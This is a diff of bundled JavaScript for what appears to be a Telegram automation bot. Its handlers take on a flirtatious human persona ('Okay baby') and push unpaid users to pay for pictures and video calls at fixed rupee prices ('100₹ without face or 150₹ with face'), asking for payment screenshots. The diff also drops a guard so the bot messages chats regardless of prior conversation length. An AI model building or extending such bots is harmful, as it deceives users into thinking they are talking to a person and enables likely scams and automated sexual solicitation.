                 await (0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.respond)(event, (0,_messages_messageUtils__WEBPACK_IMPORTED_MODULE_2__.pickOneMsg)([
                     "Okay baby, no force. Just try small demo if you want later.\n\nDemo pics 25₹, video call 50₹.",
                     "No problem dear. I only do paid service, but demo is small amount if you want to trust first.\n\nPics 25₹, call 50₹.",
@@ -48558,6 +48665,20 @@ const unpaidPatterns = [
                 return true;
             }
             return false;
+        }
+    },
+    {
+        id: 'unpaid_user_ready_for_service_confirmation',
+        priority: 139,
+        scope: 'unpaid',
+        description: 'Bare readiness question from an unpaid user',
+        handler: async (event, text) => {
+            const trimmed = trimPunctuation(text);
+            const ready = ['ready', 'are you ready', 'are u ready', 'u ready', 'you ready'].includes(trimmed);
+            if (!ready || (0,_tg_core_utils_contains__WEBPACK_IMPORTED_MODULE_1__.contains)(text, ['not ready', 'nahi ready', 'nhi ready']))
+                return false;
+            await (0,_core_inhandlerUpdated__WEBPACK_IMPORTED_MODULE_0__.respond)(event, `Yes, I'm **ready**.\nPay and Msg me!\n\n**100₹ without face** or **150₹ with face**, then send the payment screenshot.`, true);
+            return true;
         }
     },
     {
@@ -63990,31 +64111,24 @@ __webpack_require__.r(__webpack_exports__);
 
 const logger = new _tg_core_utils_logger__WEBPACK_IMPORTED_MODULE_3__.Logger('tg-aut:send-message');
 async function trySendingMsg({ chatId, username, accessHash, }, client, msgObj) {
-    logger.log(`Sending: ${username ?? chatId} : ${msgObj.message}`);
+    logger.log(`Attempting message send to ${username ?? chatId}`);
     const dialogsManager = _core_TelegramManager__WEBPACK_IMPORTED_MODULE_1__.TelegramManager.getInstance().dialogManager;
-    let msgs = null;
     try {
         const entity = await dialogsManager.getEntity(chatId).catch(() => null) || await (0,_tg_core_telegram_utils_getSafeEntity__WEBPACK_IMPORTED_MODULE_2__.safeGetEntity)(client, chatId);
-        msgs = await client.getMessages(entity || chatId, { limit: 8 });
-        if (msgs.total && msgs.total > 3) {
-            await client.sendMessage(entity || chatId, msgObj);
-            try {
-                await dialogsManager.markAsRead(chatId);
-            }
-            catch (error) {
-                (0,_tg_core_utils_parseError__WEBPACK_IMPORTED_MODULE_0__.parseError)(error, `ErrorMarkAsRead for Chat : ${chatId} | Username: @${username}}`);
-            }
+        await client.sendMessage(entity || chatId, msgObj);
+        logger.log(`Sent message successfully to ${username ?? chatId}`);
+        try {
+            await dialogsManager.markAsRead(chatId);
         }
+        catch (error) {
+            (0,_tg_core_utils_parseError__WEBPACK_IMPORTED_MODULE_0__.parseError)(error, `ErrorMarkAsRead for Chat : ${chatId} | Username: @${username}}`);
+        }
+        return true;
     }
     catch (error) {
         (0,_tg_core_utils_parseError__WEBPACK_IMPORTED_MODULE_0__.parseError)(error, `Error Sending msg: ${msgObj.message} to ${chatId}`);
-    }
-    finally {
-        // MEMORY OPTIMIZATION: Clear msgs array to help GC - Api.Message objects are HUGE
-        if (msgs) {
-            msgs.length = 0;
-            msgs = null;
-        }
+        logger.error(`Message send failed for ${username ?? chatId}`);
+        return false;
     }
 }
 
